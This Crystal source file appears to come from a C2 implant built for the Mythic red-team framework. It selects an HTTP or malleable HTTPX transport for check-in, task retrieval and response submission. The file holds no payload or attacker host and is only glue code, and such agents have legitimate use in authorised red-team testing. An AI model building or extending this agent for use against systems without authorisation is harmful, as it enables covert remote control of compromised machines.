require "./transport/base"

{% if flag?(:httpx_profile) %}
  require "./transport/httpx"
{% else %}
  require "./transport/http" 
{% end %}

module Dark::Agent
  # Transport module for C2 communication with Mythic server
  #
  # Handles secure agent-server communications with encryption, check-in,
  # task retrieval, and response submission. Designed for multiple transport
  # types through a common base class.
  module Transport
    # TRANSPORT SELECTION AND INITIALIZATION
    
    # Conditionally include only the appropriate transport class based on profile type
    {% if flag?(:httpx_profile) %}
      # Set active class type to HTTPX for malleable profiles
      Active = Dark::Agent::Transport::HTTPX
    {% else %}
      # Set active class type to HTTP for standard profiles
      Active = Dark::Agent::Transport::HTTP
    {% end %}

    # Create method that returns the appropriate transport based on compile flags
    #
    # Mythic transport factory: Creates either HTTP or HTTPX transport based on compilation flags
    def self.create(config : Config::Base)
      Active.new(config)
    end
  end
end